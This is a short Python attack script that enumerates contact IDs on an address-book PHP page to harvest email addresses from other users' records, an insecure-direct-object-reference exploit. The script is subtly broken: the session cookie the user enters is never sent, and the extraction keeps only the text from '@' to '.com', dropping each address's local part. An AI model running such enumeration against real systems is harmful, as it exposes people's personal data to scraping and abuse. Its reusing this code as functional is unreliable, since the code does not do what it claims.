import requests

# Set the IP address and URL
ip_address = "127.0.0.1"  # Replace with the actual IP address
url = "/addressbook/viewContact.php"

# Set the headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Cookie": "PHPSESSID="  # PHPSESSID value will be provided by user input
}

# Initialize variables
contact_id = 0
email_list = []

# Input PHPSESSID value from user
phpsessid = input("Enter PHPSESSID value: ")

while True:
    # Set the parameters
    params = {"contactId": str(contact_id)}

    # Make the HTTPS request
    response = requests.get(f"https://{ip_address}{url}", params=params, headers=headers)

    # Filter the response to find email addresses
    filtered_response = response.text.replace(" ", "")  # Remove spaces for filtering
    if "@" in filtered_response:  # Check if an email address is present
        email_start = filtered_response.find("@")
        email_end = filtered_response.find(".com", email_start) + 4
        email = filtered_response[email_start:email_end]
        email_list.append(email)

    # Break the loop if the response doesn't contain any real text
    if not filtered_response.strip():
        break

    contact_id += 1

# Save the discovered email addresses to a text file
with open("discovered-emails.txt", "w") as file:
    file.write("\n".join(email_list))

print("Email addresses saved to 'discovered-emails.txt'")
